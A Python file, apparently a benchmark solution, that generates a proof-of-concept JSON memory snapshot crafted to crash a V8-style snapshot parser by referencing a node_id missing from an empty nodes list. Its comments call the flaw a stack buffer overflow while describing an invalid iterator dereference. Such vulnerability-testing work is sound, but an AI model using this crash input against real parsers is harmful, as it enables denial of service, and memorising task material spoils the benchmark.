import json

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a stack buffer overflow in a memory snapshot parser,
        # triggered by a missing check for node existence. The snapshot format
        # appears to be JSON-based, similar to those used by V8.
        #
        # The PoC constructs a snapshot with a `trace_tree`. A node in this tree
        # references a graph node via `node_id`. The parser is expected to build a
        # map of graph nodes from the `nodes` list.
        #
        # The trigger mechanism is as follows:
        # 1. Provide an empty `nodes` list. This results in an empty `node_id_map`.
        # 2. Define a `trace_tree` with a single trace node.
        # 3. This trace node specifies a `node_id` (e.g., 1) that does not exist in the map.
        # 4. The parser looks up this `node_id`, gets an end-iterator from the map,
        #    and then dereferences it without checking for validity, causing a crash.
        #
        # To ensure the parser reaches the vulnerable code, the PoC includes other
        # necessary fields and structures (`trace_function_infos`, `strings`) with
        # valid cross-references, making the snapshot appear well-formed until the
        # invalid `node_id` is processed. The resulting JSON is minified for size.

        poc_data = {
            "nodes": [],
            "trace_tree": [{
                "id": 1,
                "node_id": 1,
                "function_info_index": 0
            }],
            "trace_function_infos": [{
                "function_id": 1,
                "name": 0
            }],
            "strings": [""]
        }

        poc_json_string = json.dumps(poc_data, separators=(',', ':'))

        return poc_json_string.encode('utf-8')